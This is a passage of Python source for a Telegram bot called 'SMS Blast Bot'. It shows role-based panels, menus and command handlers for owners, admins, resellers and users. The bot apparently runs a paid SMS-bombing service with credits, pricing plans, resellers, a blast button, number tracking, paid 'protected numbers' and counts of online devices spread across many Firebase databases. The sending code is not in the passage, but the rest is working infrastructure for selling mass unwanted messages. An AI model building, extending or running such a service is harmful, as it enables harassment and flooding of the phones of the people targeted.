    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    # Total online devices only (no per-firebase list — message was too long)
    total_online = len(CACHED_DEVICES) if CACHED_DEVICES else sum(
        fb_data.get("online", 0) for fb_data in FB_DEVICE_COUNTS.values()
    )

    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ : <b>{total_online}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    total_online = len(CACHED_DEVICES) if CACHED_DEVICES else sum(
        fb_data.get("online", 0) for fb_data in FB_DEVICE_COUNTS.values()
    )

    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ : <b>{total_online}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def reseller_panel_text(uid: int, d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    return (
        f"{em(EMOJI_MONEY, '💼')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs : <b>{len(users)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} ʀᴇsᴇʟʟᴇʀ ʙᴀʟᴀɴᴄᴇ : <b>{reseller_balance(uid, d)}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘᴇʀsᴏɴᴀʟ ᴄʀᴇᴅɪᴛs : <b>{get_user_credits(uid, d)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )


def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

def owner_kb(d: dict, viewer_uid: int | None = None) -> InlineKeyboardMarkup:
    """Clean 2-column owner dashboard; existing callbacks are kept unchanged."""
    rows = [
        [btn("🚀 ʙʟᴀsᴛ", "owner:menu:blast", EMOJI_ROCKET, "🚀"),
         btn("💳 ᴄʀᴇᴅɪᴛs", "owner:menu:credits", EMOJI_MONEY, "💳")],
        [btn("👥 ᴜsᴇʀs", "owner:menu:users", EMOJI_STAR, "👥"),
         btn("💎 ᴘʀᴇᴍɪᴜᴍ", "owner:menu:premium", EMOJI_MONEY, "💎")],
        [btn("🛡 sᴛᴀғғ", "owner:menu:staff", EMOJI_SHIELD, "🛡"),
         btn("📢 ᴄᴏᴍᴍᴜɴɪᴄᴀᴛɪᴏɴ", "owner:menu:communication", EMOJI_BELL, "📢")],
        [btn("🧰 ᴛᴏᴏʟs", "owner:menu:tools", EMOJI_GEAR, "🧰"),
         btn("⚙️ sᴇᴛᴛɪɴɢs", "owner:menu:settings", EMOJI_GEAR, "⚙️")],
        [btn("🔄 ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


def owner_submenu_kb(section: str, d: dict, viewer_uid: int | None = None) -> InlineKeyboardMarkup:
    """Owner submenus. Every button points to an existing feature callback."""
    if section == "blast":
        rows = [
            [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"),
             btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
            [btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹"),
             btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        ]
    elif section == "credits":
        mode_btn = ("🔴 ᴅɪsᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ", "owner:free:off") if d.get("free_mode") else ("🟢 ᴇɴᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ", "owner:free:on")
        rows = [
            [btn("➕ ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰"),
             btn("➖ ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰")],
            [btn("➕ ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰"),
             btn("➖ ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰")],
            [btn("💳 ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳"),
             btn("🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁")],
            [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        ]
    elif section == "users":
        rows = [
            [btn("👥 ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥"),
             btn("🚫 ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫")],
            [btn("✅ ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅"),
             btn("📜 sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋")],
        ]
    elif section == "premium":
        if not is_premium_admin(viewer_uid or 0):
            return InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]])
        rows = [
            [btn("💎 sᴇʟʟ ᴄʀᴇᴅɪᴛ", "owner:premium:add", EMOJI_MONEY, "💎")],
            [btn("📤 ᴇxᴘᴏʀᴛ ᴄʀᴇᴅɪᴛs", "owner:premium:export", EMOJI_GEAR, "📤"),
             btn("📥 ɪᴍᴘᴏʀᴛ ᴄʀᴇᴅɪᴛs", "owner:premium:import", EMOJI_GEAR, "📥")],
        ]
    elif section == "staff":
        rows = [
            [btn("👑 sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑"),
             btn("🛡 ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡")],
            [btn("💼 ʀᴇsᴇʟʟᴇʀs", "owner:resellers:menu", EMOJI_MONEY, "💼")],
        ]
    elif section == "communication":
        rows = [
            [btn("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"),
             btn("📜 ᴀᴄᴛɪᴠɪᴛʏ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜")],
        ]
    elif section == "tools":
        rows = [
            [btn("📊 ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊"),
             btn("📤 ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤")],
            [btn("🔒 ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒"),
             btn("🔐 ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐")],
            [btn("📊 ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊")],
        ]
    elif section == "settings":
        rows = [[btn("⚙️ sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️")]]
    else:
        rows = []
    rows.append([btn("🔙 ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🚀 ʙʟᴀsᴛ", "admin:send", EMOJI_ROCKET, "🚀"), btn("📹 ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹")],
        [btn("👥 ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥"), btn("📊 sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊")],
        [btn("🛡 ᴜsᴇʀ ᴄᴏɴᴛʀᴏʟ", "admin:menu:users", EMOJI_SHIELD, "🛡"), btn("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢")],
        [btn("🔄 ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄")],
    ])


def admin_submenu_kb(section: str) -> InlineKeyboardMarkup:
    if section == "users":
        rows = [[btn("👥 ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥"),
                 btn("🚫 ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫")],
                [btn("✅ ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅")]]
    else:
        rows = []
    rows.append([btn("🔙 ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def reseller_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🚀 sᴇɴᴅ sᴍs", "reseller:send", EMOJI_ROCKET, "📤"), btn("👥 ᴜsᴇʀs", "reseller:users:list", EMOJI_STAR, "👥")],
        [btn("💳 ᴄʀᴇᴅɪᴛs", "reseller:menu:credits", EMOJI_MONEY, "💳"), btn("🛡 ᴜsᴇʀ ᴄᴏɴᴛʀᴏʟ", "reseller:menu:users", EMOJI_SHIELD, "🛡")],
        [btn("🔒 ᴘʀᴏᴛᴇᴄᴛ", "reseller:protect", EMOJI_LOCK, "🔒"), btn("💰 ᴍʏ ʙᴀʟᴀɴᴄᴇ", "reseller:balance", EMOJI_MONEY, "💳")],
        [btn("🔄 ʀᴇғʀᴇsʜ", "reseller:home", EMOJI_GEAR, "🔄")]
    ])


def reseller_submenu_kb(section: str) -> InlineKeyboardMarkup:
    if section == "credits":
        rows = [[btn("🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ", "reseller:redeem:gen", EMOJI_GIFT, "🎁"),
                 btn("➕ ᴀᴅᴅ ᴄʀᴇᴅɪᴛ", "reseller:credits:add", EMOJI_MONEY, "💰")],
                [btn("➖ ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛ", "reseller:credits:deduct", EMOJI_CROSS, "💰")]]
    elif section == "users":
        rows = [[btn("🚫 ʙᴀɴ ᴜsᴇʀ", "reseller:ban", EMOJI_CROSS, "🚫"),
                 btn("✅ ᴜɴʙᴀɴ ᴜsᴇʀ", "reseller:unban:menu", EMOJI_CHECK, "✅")]]
    else:
        rows = []
    rows.append([btn("🔙 ʙᴀᴄᴋ", "reseller:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🚀 sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤"), btn("💳 ᴄʀᴇᴅɪᴛs", "user:menu:credits", EMOJI_MONEY, "💳")],
        [btn("📹 ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹"), btn("📊 ᴀᴄᴛɪᴠɪᴛʏ", "user:menu:activity", EMOJI_STAR, "📊")],
        [btn("👥 ʀᴇғᴇʀʀᴀʟ", "user:refer", EMOJI_STAR, "👥"), btn("ℹ️ ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️")],
    ])


def user_submenu_kb(section: str) -> InlineKeyboardMarkup:
    if section == "credits":
        rows = [[btn("💳 ᴍʏ ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳"),
                 btn("💰 ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰")],
                [btn("🎁 ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁")]]
    elif section == "activity":
        rows = [[btn("📊 sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊"),
                 btn("📜 sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜")]]
    else:
        rows = []
    rows.append([btn("🔙 ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, vid in enumerate(videos, 1):
        vid_label = f"Video #{idx}"
        rows.append([btn(vid_label, "noop", EMOJI_VIDEO, "📹"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# Fixed: Firebase menu keyboard with pagination to avoid "reply markup too long"
def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
            btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
        ])
    
    nav_row = []
    if page > 0:
        nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

R = Router()

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""

    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                        f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except: pass
        save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}\nManager: @Titanium_Ansh")

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d, uid), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_reseller(uid, d):
        await msg.answer(reseller_panel_text(uid, d), reply_markup=reseller_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein. Sahilxalone.t.me ", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("approval"))
async def cmd_approval(msg: Message):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    parts = msg.text.split(maxsplit=1) if msg.text else []
    if len(parts) != 2:
        await msg.answer("Usage: /approval <user_id>")
        return
    try:
        target_id = int(parts[1].strip())
    except ValueError:
        await msg.answer("Usage: /approval <user_id>")
        return

    if target_id not in d.get("approved", []):
        d.setdefault("approved", []).append(target_id)
        save(d)

    try:
        await msg.bot.send_message(
            target_id,
            "🎉 Congratulations! Aapko bot mein approve kar diya gaya hai. Ab aap /start karke bot use kar sakte hain."
        )
    except Exception:
        pass

    await msg.answer(f"✅ User {target_id} approved.")


@R.message(Command("revoke"))
async def cmd_revoke(msg: Message):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    parts = msg.text.split(maxsplit=1) if msg.text else []
    if len(parts) != 2:
        await msg.answer("Usage: /revoke <user_id>")
        return
    try:
        target_id = int(parts[1].strip())
    except ValueError:
        await msg.answer("Usage: /revoke <user_id>")
        return

    if target_id in d.get("approved", []):
        d["approved"].remove(target_id)
        save(d)

    await msg.answer(f"✅ User {target_id} approved list se hata diya gaya hai.")


# ==================== RESELLER MANAGEMENT ====================

@R.message(Command("addreseller"))
async def cmd_add_reseller(msg: Message):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    parts = msg.text.split(maxsplit=1) if msg.text else []
    if len(parts) != 2:
        await msg.answer("Usage: /addreseller <user_id>")
        return
    try:
        target_id = int(parts[1].strip())
    except ValueError:
        await msg.answer("Usage: /addreseller <user_id>")
        return
    if is_owner(target_id, d) or target_id in d.get("admins", []):
        await msg.answer("❌ Owner/Admin ko reseller nahi bana sakte!")
        return
    if target_id in d.get("resellers", []):
        await msg.answer("⚠️ User already reseller hai!")
        return
    d.setdefault("resellers", []).append(target_id)
